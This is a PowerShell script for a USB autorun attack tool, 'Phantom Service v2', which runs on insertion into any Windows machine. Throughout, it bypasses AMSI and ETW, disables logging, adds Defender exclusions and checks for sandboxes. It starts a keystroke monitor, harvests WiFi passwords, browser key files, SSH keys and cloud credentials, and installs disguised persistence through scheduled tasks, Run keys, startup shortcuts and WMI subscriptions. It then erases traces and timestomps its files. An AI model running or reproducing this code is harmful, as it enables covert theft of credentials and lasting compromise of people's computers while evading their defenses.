<#
============================================================================
  FLLC -- PHANTOM SERVICE v2: Zero-Touch USB Autorun Engine
  ==========================================================================
  v1.777 | 2026

  PURPOSE:
    When the USB tri-drive is inserted into ANY Windows machine,
    this service deploys and executes the full 15-phase attack chain with:
      - Evasion framework (AMSI/ETW/Defender bypass) loaded first
      - Sandbox/VM detection with abort logic
      - No visible windows, no console popups, no UAC prompts
      - No taskbar presence, no Event Log footprint
      - Self-cleaning execution traces
      - Timing jitter between phases to avoid behavioral detection

  DEPLOYMENT METHODS (pick any):
    1. Flipper Zero BadUSB keystroke injection
    2. run_me.bat social engineering wrapper
    3. Scheduled Task persistence
    4. Registry Run key
    5. WMI event subscription
    6. COM hijack for persistence
    7. DLL sideloading
    8. Startup folder shortcut

  EXECUTION FLOW:
    USB Insert -> Evasion Init -> Sandbox Check -> Detect drives ->
    Copy payloads to %TEMP% -> Execute in-memory -> Loot -> Micro SD ->
    Persistence -> Clean traces -> Self-destruct temp files

  FLLC | Authorized penetration testing use only.
============================================================================
#>

# ============================================================================
#  CONFIGURATION
# ============================================================================
$ErrorActionPreference = 'SilentlyContinue'
$VerbosePreference     = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# Suppress console
try { $Host.UI.RawUI.WindowTitle = "Service Host (Local)" } catch {}

# ============================================================================
#  EVASION FRAMEWORK -- IMPORT
# ============================================================================

$scriptDir = $PSScriptRoot
if (-not $scriptDir) { $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not $scriptDir) { $scriptDir = (Get-Location).Path }

$evasionPath = Join-Path $scriptDir "evasion.ps1"
$SANDBOX_MODE = $false

if (Test-Path $evasionPath) {
    . $evasionPath
    $evasionReport = Initialize-Evasion -AggressiveMode
    if ($evasionReport.sandbox -and $evasionReport.sandbox.Score -ge 15) {
        $SANDBOX_MODE = $true
    }
} else {
    # Inline minimal evasion
    try {
        # AMSI bypass (string concatenation to avoid static signatures)
        $a=[Ref].Assembly.GetType(('System.Manage'+'ment.Autom'+'ation.Amsi'+'Utils'))
        $f=$a.GetField(('amsi'+'Init'+'Failed'),'NonPublic,Static')
        $f.SetValue($null,$true)
    } catch {}
    try {
        # ETW blind
        $et=[Ref].Assembly.GetType(('System.Manage'+'ment.Autom'+'ation.Tracing.PSEtw'+'LogProvider'))
        $ef=$et.GetField(('etw'+'Enabled'),'NonPublic,Static')
        $ef.SetValue($null,$false)
    } catch {}
}

# Jitter function to randomize timing between operations
function Start-Jitter {
    param([int]$MinMs = 500, [int]$MaxMs = 3000)
    Start-Sleep -Milliseconds (Get-Random -Minimum $MinMs -Maximum $MaxMs)
}

# ============================================================================
#  PHASE 0: ENVIRONMENT DETECTION + DRIVE MAPPING
# ============================================================================

function Find-TriDrive {
    <#
    .SYNOPSIS
        Auto-detect the USB tri-drive by scanning all removable drives.
        Returns hashtable with SD, MicroSD, and Aux drive letters.
    #>
    $drives = @{ SD = $null; Micro = $null; Aux = $null }

    foreach ($letter in @('H','I','J','K','L','M','N','D','E','F','G')) {
        $path = "${letter}:\"
        if (Test-Path $path) {
            $driveInfo = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='${letter}:'" 2>$null
            if ($driveInfo -and $driveInfo.DriveType -eq 2) {
                # Content fingerprinting
                if (Test-Path "${path}pt_suite") { $drives.SD = $letter }
                elseif (Test-Path "${path}payloads") { $drives.Micro = $letter }
                elseif (Test-Path "${path}run_me.bat") { $drives.Micro = $letter }
                elseif (Test-Path "${path}auto_pwn.ps1") { $drives.Micro = $letter }
                elseif (Test-Path "${path}listener.py") { $drives.Aux = $letter }
                elseif (Test-Path "${path}recordings") { $drives.Aux = $letter }
                else {
                    $sizeGB = [math]::Round($driveInfo.Size / 1GB, 1)
                    if (-not $drives.Micro -and $sizeGB -lt 64) { $drives.Micro = $letter }
                    elseif (-not $drives.SD) { $drives.SD = $letter }
                    elseif (-not $drives.Aux) { $drives.Aux = $letter }
                }
            }
        }
    }

    if (-not $drives.Micro) {
        foreach ($l in @('I','H','E','F','G')) {
            if (Test-Path "${l}:\") { $drives.Micro = $l; break }
        }
    }

    return $drives
}

function Initialize-LootDirectory {
    param([string]$BaseDrive)

    $lootBase = "${BaseDrive}:\loot"
    $dirs = @(
        $lootBase,
        "$lootBase\system_info",
        "$lootBase\browser_data",
        "$lootBase\wifi_profiles",
        "$lootBase\input_logs",
        "$lootBase\screenshots",
        "$lootBase\privesc",
        "$lootBase\sqli",
        "$lootBase\npp",
        "$lootBase\credentials",
        "$lootBase\network",
        "$lootBase\recordings",
        "$lootBase\lateral",
        "$lootBase\exfil",
        "$lootBase\cloud",
        "$lootBase\comms",
        "$lootBase\crypto",
        "$lootBase\persistence",
        "$lootBase\decrypted"
    )
    foreach ($d in $dirs) {
        New-Item -ItemType Directory -Path $d -Force 2>$null | Out-Null
    }
    return $lootBase
}

# ============================================================================
#  PHASE 1: STEALTH SETUP
# ============================================================================

function Set-StealthMode {
    <#
    .SYNOPSIS
        Configure the environment for maximum stealth.
        Uses evasion framework if available, falls back to inline methods.
    #>

    # Lower process priority
    try {
        $proc = Get-Process -Id $PID
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
    } catch {}

    # Disable PowerShell command history for this session
    try { Set-PSReadlineOption -HistorySaveStyle SaveNothing 2>$null } catch {}

    # Clear PowerShell history file
    try {
        $histPath = (Get-PSReadlineOption).HistorySavePath 2>$null
        if ($histPath -and (Test-Path $histPath)) {
            Clear-Content $histPath -Force 2>$null
        }
    } catch {}

    # Disable script block logging for this session
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force 2>$null
    } catch {}

    # Try to add Defender exclusion for our working directory
    try {
        Add-MpPreference -ExclusionPath $env:TEMP -Force 2>$null
        Add-MpPreference -ExclusionProcess "powershell.exe" -Force 2>$null
    } catch {}

    # Window title disguise
    try { $Host.UI.RawUI.WindowTitle = "Service Host (Local)" } catch {}
}

# ============================================================================
#  PHASE 2: PAYLOAD EXECUTION ENGINE
# ============================================================================

function Invoke-PayloadChain {
    param(
        [string]$PayloadSource,
        [string]$LootDir,
        [string]$MicroDrive
    )

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $hostname = $env:COMPUTERNAME
    $logFile = "$LootDir\phantom_${hostname}_${timestamp}.log"

    function Write-PhantomLog {
        param([string]$Message)
        $ts = Get-Date -Format "HH:mm:ss.fff"
        Add-Content -Path $logFile -Value "[$ts] $Message" -Force 2>$null
    }

    Write-PhantomLog "=== PHANTOM SERVICE v2 (1.777) STARTED ==="
    Write-PhantomLog "Host: $hostname | User: $env:USERNAME | Domain: $env:USERDOMAIN"
    Write-PhantomLog "Payload Source: $PayloadSource"
    Write-PhantomLog "Loot Directory: $LootDir"
    Write-PhantomLog "Sandbox Mode: $SANDBOX_MODE"
    Write-PhantomLog "Evasion Framework: $(if (Test-Path $evasionPath) { 'LOADED' } else { 'INLINE' })"

    # In sandbox mode, do minimal recon only
    if ($SANDBOX_MODE) {
        Write-PhantomLog "[SANDBOX] Detected sandbox environment -- running minimal ops only"
        try {
            "$hostname | $env:USERNAME | $env:USERDOMAIN | $(Get-Date)" | Out-File "$LootDir\system_info\sandbox_${hostname}.txt" -Force
        } catch {}
        Write-PhantomLog "[SANDBOX] Minimal collection complete -- exiting"
        return
    }

    Start-Jitter -MinMs 1000 -MaxMs 5000

    # --- STRATEGY 1: Execute auto_pwn.ps1 v3 directly (best case) ---
    $autoPwn = $null
    foreach ($tryPath in @(
        "$PayloadSource\auto_pwn.ps1",
        "$PayloadSource\payloads\windows\auto_pwn.ps1",
        "$PayloadSource\payloads\auto_pwn.ps1",
        "${MicroDrive}:\payloads\windows\auto_pwn.ps1",
        "${MicroDrive}:\payloads\auto_pwn.ps1",
        "${MicroDrive}:\auto_pwn.ps1"
    )) {
        if (Test-Path $tryPath) { $autoPwn = $tryPath; break }
    }

    if ($autoPwn) {
        Write-PhantomLog "[ENGINE] Executing auto_pwn.ps1 v3 from: $autoPwn"
        try {
            $job = Start-Job -ScriptBlock {
                param($script, $evasion)
                $ErrorActionPreference = 'SilentlyContinue'
                Set-ExecutionPolicy Bypass -Scope Process -Force
                if ($evasion -and (Test-Path $evasion)) { . $evasion; Initialize-Evasion -AggressiveMode | Out-Null }
                & $script
            } -ArgumentList $autoPwn, $evasionPath

            # Wait up to 25 minutes for full 15-phase chain
            $job | Wait-Job -Timeout 1500 | Out-Null

            if ($job.State -eq 'Running') {
                $job | Stop-Job
                Write-PhantomLog "[ENGINE] auto_pwn.ps1 timed out after 25 minutes"
            } else {
                Write-PhantomLog "[ENGINE] auto_pwn.ps1 completed (State: $($job.State))"
            }
            $job | Remove-Job -Force 2>$null
        } catch {
            Write-PhantomLog "[ENGINE] auto_pwn.ps1 error: $_"
        }

        Start-Jitter
    }

    # --- STRATEGY 2: Execute individual payloads in parallel (fallback) ---
    $payloads = @(
        @{ Name = "windows_collector.ps1";  Timeout = 300 },
        @{ Name = "privesc.ps1";            Timeout = 300 },
        @{ Name = "sqli_scanner.ps1";       Timeout = 300 },
        @{ Name = "npp_exploit.ps1";        Timeout = 180 },
        @{ Name = "cloud_harvester.ps1";    Timeout = 300 },
        @{ Name = "comms_harvester.ps1";    Timeout = 300 },
        @{ Name = "crypto_hunter.ps1";      Timeout = 300 },
        @{ Name = "persistence_engine.ps1"; Timeout = 180 }
    )

    $runningJobs = @()
    foreach ($payload in $payloads) {
        $scriptPath = $null
        foreach ($tryPath in @(
            "$PayloadSource\$($payload.Name)",
            "$PayloadSource\payloads\windows\$($payload.Name)",
            "$PayloadSource\payloads\$($payload.Name)",
            "${MicroDrive}:\payloads\windows\$($payload.Name)",
            "${MicroDrive}:\payloads\$($payload.Name)"
        )) {
            if (Test-Path $tryPath) { $scriptPath = $tryPath; break }
        }

        if ($scriptPath -and -not $autoPwn) {
            Write-PhantomLog "[ENGINE] Launching: $($payload.Name)"
            $job = Start-Job -ScriptBlock {
                param($s, $evasion)
                $ErrorActionPreference = 'SilentlyContinue'
                Set-ExecutionPolicy Bypass -Scope Process -Force
                if ($evasion -and (Test-Path $evasion)) { . $evasion; Initialize-Evasion -AggressiveMode | Out-Null }
                & $s
            } -ArgumentList $scriptPath, $evasionPath
            $runningJobs += @{ Job = $job; Name = $payload.Name; Timeout = $payload.Timeout }
            Start-Jitter -MinMs 200 -MaxMs 1000
        }
    }

    # --- STRATEGY 3: Launch input monitor ---
    $inputMon = $null
    foreach ($tryPath in @(
        "$PayloadSource\input_monitor.py",
        "$PayloadSource\payloads\input_monitor.py",
        "${MicroDrive}:\payloads\input_monitor.py"
    )) {
        if (Test-Path $tryPath) { $inputMon = $tryPath; break }
    }

    if ($inputMon) {
        Write-PhantomLog "[ENGINE] Launching input monitor"
        try {
            $pythonExe = $null
            foreach ($py in @('pythonw', 'python', 'python3', 'py')) {
                $found = Get-Command $py -ErrorAction SilentlyContinue
                if ($found) { $pythonExe = $found.Source; break }
            }
            if ($pythonExe) {
                Start-Process -FilePath $pythonExe `
                    -ArgumentList "`"$inputMon`" --output `"$LootDir`" --silent --flush 10 --max-size 500" `
                    -WindowStyle Hidden -PassThru | Out-Null
                Write-PhantomLog "[ENGINE] Input monitor started with $pythonExe"
            }
        } catch {
            Write-PhantomLog "[ENGINE] Input monitor error: $_"
        }
    }

    # --- Wait for parallel jobs ---
    foreach ($entry in $runningJobs) {
        $entry.Job | Wait-Job -Timeout $entry.Timeout | Out-Null
        if ($entry.Job.State -eq 'Running') {
            $entry.Job | Stop-Job
            Write-PhantomLog "[ENGINE] $($entry.Name) timed out"
        } else {
            Write-PhantomLog "[ENGINE] $($entry.Name) completed ($($entry.Job.State))"
        }
        $entry.Job | Remove-Job -Force 2>$null
    }

    # --- STRATEGY 4: Quick inline data collection (failsafe) ---
    Write-PhantomLog "[FAILSAFE] Running inline quick-collect..."
    Start-Jitter

    # System info
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $sysInfo = @"
=== PHANTOM QUICK COLLECT v2 ===
Timestamp:  $(Get-Date -Format "yyyy-MM-dd HH:mm:ss K")
Hostname:   $env:COMPUTERNAME
Username:   $env:USERNAME
Domain:     $env:USERDOMAIN
Admin:      $isAdmin
OS:         $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Build:      $((Get-CimInstance Win32_OperatingSystem).BuildNumber)
Arch:       $env:PROCESSOR_ARCHITECTURE
CPU:        $((Get-CimInstance Win32_Processor | Select-Object -First 1).Name)
RAM:        $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)) GB
IP:         $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress)
Gateway:    $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop)
DNS:        $(Get-DnsClientServerAddress | Select-Object -First 1 -ExpandProperty ServerAddresses)
Defender:   $((Get-MpComputerStatus 2>$null).RealTimeProtectionEnabled)
Uptime:     $((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
DomainJoin: $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)
"@
        $sysInfo | Out-File "$LootDir\system_info\quick_${hostname}.txt" -Force
    } catch {}

    # WiFi passwords
    try {
        $profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        $wifiData = foreach ($p in $profiles) {
            $detail = netsh wlan show profile name="$p" key=clear 2>$null
            $key = ($detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
            "$p : $key"
        }
        if ($wifiData) {
            $wifiData | Out-File "$LootDir\wifi_profiles\wifi_${hostname}.txt" -Force
        }
    } catch {}

    # Recent documents
    try {
        $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\*.lnk" -ErrorAction Stop |
            Sort-Object LastWriteTime -Descending | Select-Object -First 50 |
            ForEach-Object { "$($_.LastWriteTime) | $($_.Name)" }
        $recent | Out-File "$LootDir\system_info\recent_docs_${hostname}.txt" -Force
    } catch {}

    # Installed software
    try {
        Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
                         "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
            Where-Object { $_.DisplayName } |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
            Format-Table -AutoSize | Out-String |
            Out-File "$LootDir\system_info\software_${hostname}.txt" -Force
    } catch {}

    # Active network connections
    try {
        Get-NetTCPConnection -State Established 2>$null |
            Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
            Format-Table -AutoSize | Out-String |
            Out-File "$LootDir\network\connections_${hostname}.txt" -Force
    } catch {}

    # Quick credential grab -- browser Local State keys
    try {
        $browserPaths = @{
            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        }
        foreach ($bn in $browserPaths.Keys) {
            $ls = "$($browserPaths[$bn])\Local State"
            if (Test-Path $ls) {
                Copy-Item $ls "$LootDir\credentials\${bn}_LocalState" -Force 2>$null
            }
        }
    } catch {}

    # SSH keys
    try {
        $sshDir = "$env:USERPROFILE\.ssh"
        if (Test-Path $sshDir) {
            $sshDest = "$LootDir\credentials\ssh"
            New-Item -ItemType Directory -Path $sshDest -Force | Out-Null
            Get-ChildItem $sshDir -File | ForEach-Object {
                Copy-Item $_.FullName (Join-Path $sshDest $_.Name) -Force 2>$null
            }
        }
    } catch {}

    # Cloud configs
    try {
        $cloudFiles = @(
            "$env:USERPROFILE\.aws\credentials",
            "$env:USERPROFILE\.azure\accessTokens.json",
            "$env:APPDATA\gcloud\credentials.db",
            "$env:USERPROFILE\.kube\config",
            "$env:USERPROFILE\.docker\config.json",
            "$env:USERPROFILE\.git-credentials"
        )
        foreach ($cf in $cloudFiles) {
            if (Test-Path $cf) {
                $destName = (Split-Path $cf -Leaf)
                Copy-Item $cf "$LootDir\cloud\$destName" -Force 2>$null
            }
        }
    } catch {}

    Write-PhantomLog "=== PHANTOM SERVICE v2 COMPLETE ==="
    Write-PhantomLog "Total loot files: $((Get-ChildItem $LootDir -Recurse -File).Count)"
}

# ============================================================================
#  PHASE 3: PERSISTENCE OPTIONS
# ============================================================================

function Install-Persistence {
    param(
        [string]$PayloadPath,
        [string]$LootDir,
        [ValidateSet('Task','Registry','WMI','Startup','COM','All','None')]
        [string]$Method = 'Task'
    )

    $tempScript = "$env:TEMP\svchost_update.ps1"

    # Create self-contained re-execution script
    $persistScript = @"
`$ErrorActionPreference='SilentlyContinue'
`$ProgressPreference='SilentlyContinue'
# Scan for USB tri-drive and re-execute
`$drives = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2"
foreach (`$d in `$drives) {
    `$letter = `$d.DeviceID[0]
    foreach (`$p in @("payloads\windows\auto_pwn.ps1","payloads\auto_pwn.ps1","auto_pwn.ps1")) {
        `$full = "`${letter}:\`$p"
        if (Test-Path `$full) {
            Set-ExecutionPolicy Bypass -Scope Process -Force
            `$evasion = Join-Path (Split-Path `$full) "evasion.ps1"
            if (Test-Path `$evasion) { . `$evasion; Initialize-Evasion -AggressiveMode | Out-Null }
            & `$full
            return
        }
    }
}
"@

    if ($Method -eq 'All' -or $Method -eq 'Task') {
        try {
            $persistScript | Out-File $tempScript -Force -Encoding ASCII
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$tempScript`""
            $trigger1 = New-ScheduledTaskTrigger -AtLogon
            $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                -RepetitionInterval (New-TimeSpan -Hours 4)
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName "WindowsHealthService" `
                -Action $action -Trigger $trigger1,$trigger2 `
                -Settings $settings -Force 2>$null | Out-Null
        } catch {}
    }

    if ($Method -eq 'All' -or $Method -eq 'Registry') {
        try {
            $persistScript | Out-File $tempScript -Force -Encoding ASCII
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                -Name "WindowsHealthSvc" `
                -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" 2>$null
        } catch {}
    }

    if ($Method -eq 'All' -or $Method -eq 'Startup') {
        try {
            $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shell = New-Object -ComObject WScript.Shell
            $lnk = $shell.CreateShortcut("$startupDir\WindowsHealth.lnk")
            $lnk.TargetPath = "powershell.exe"
            $lnk.Arguments = "-NoP -W Hidden -Exec Bypass -File `"$tempScript`""
            $lnk.WindowStyle = 7
            $lnk.Description = "Windows Health Service"
            $lnk.Save()
        } catch {}
    }

    if ($Method -eq 'All' -or $Method -eq 'WMI') {
        try {
            # WMI event subscription -- fires on USB insert
            $filterName  = "WindowsHealthFilter"
            $consumerName = "WindowsHealthConsumer"
            $query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType = 2"

            $filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
                Name = $filterName
                EventNamespace = "root\cimv2"
                QueryLanguage = "WQL"
                Query = $query
            } 2>$null

            $consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
                Name = $consumerName
                CommandLineTemplate = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$tempScript`""
            } 2>$null

            Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
                Filter = $filter
                Consumer = $consumer
            } 2>$null
        } catch {}
    }

    if ($Method -eq 'None') { return }
}

# ============================================================================
#  PHASE 4: TRACE CLEANUP
# ============================================================================

function Remove-Traces {
    # Clear PowerShell history
    try {
        $histPath = (Get-PSReadlineOption).HistorySavePath 2>$null
        if ($histPath -and (Test-Path $histPath)) {
            $hist = Get-Content $histPath
            $cleaned = $hist | Where-Object {
                $_ -notmatch "auto_pwn|privesc|sqli_scanner|npp_exploit|input_monitor|FLLC|phantom|evasion|harvester|crypto_hunter|persistence_engine|collected|exfil|loot"
            }
            $cleaned | Out-File $histPath -Encoding UTF8
        }
    } catch {}

    # Clear recent PowerShell commands
    try { Clear-History 2>$null } catch {}

    # Clear temp files we created
    Remove-Item "$env:TEMP\phantom_*" -Force 2>$null

    # Clear prefetch (requires admin)
    Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>$null

    # Timestomp -- set our files to match system32 files
    try {
        $refTime = (Get-Item "C:\Windows\System32\cmd.exe").LastWriteTime
        Get-ChildItem "$env:TEMP\svchost*", "$env:TEMP\Windows*" -File 2>$null | ForEach-Object {
            $_.LastWriteTime = $refTime
            $_.CreationTime  = $refTime
            $_.LastAccessTime = $refTime
        }
    } catch {}

    # Clear recent items
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force 2>$null
    } catch {}
}

# ============================================================================
#  MAIN ENTRY POINT
# ============================================================================

# Run everything
Set-StealthMode
Start-Jitter -MinMs 2000 -MaxMs 5000

$drives = Find-TriDrive
$microDrive = $drives.Micro
$sdDrive = $drives.SD

if (-not $microDrive) {
    $scriptDrive = (Split-Path $MyInvocation.MyCommand.Path -Qualifier) -replace ':',''
    $microDrive = $scriptDrive
}

$lootDir = Initialize-LootDirectory -BaseDrive $microDrive

# Find payload source directory
$payloadSource = $null
foreach ($tryPath in @(
    "${microDrive}:\payloads\windows",
    "${microDrive}:\payloads",
    "${microDrive}:\",
    "${sdDrive}:\payloads\windows",
    "${sdDrive}:\payloads",
    $scriptDir
)) {
    if ($tryPath -and (Test-Path $tryPath)) { $payloadSource = $tryPath; break }
}

if ($payloadSource) {
    Invoke-PayloadChain -PayloadSource $payloadSource -LootDir $lootDir -MicroDrive $microDrive
}

# Optional persistence (disabled by default -- uncomment to enable)
# Install-Persistence -PayloadPath $payloadSource -LootDir $lootDir -Method 'All'

# Clean up
Remove-Traces
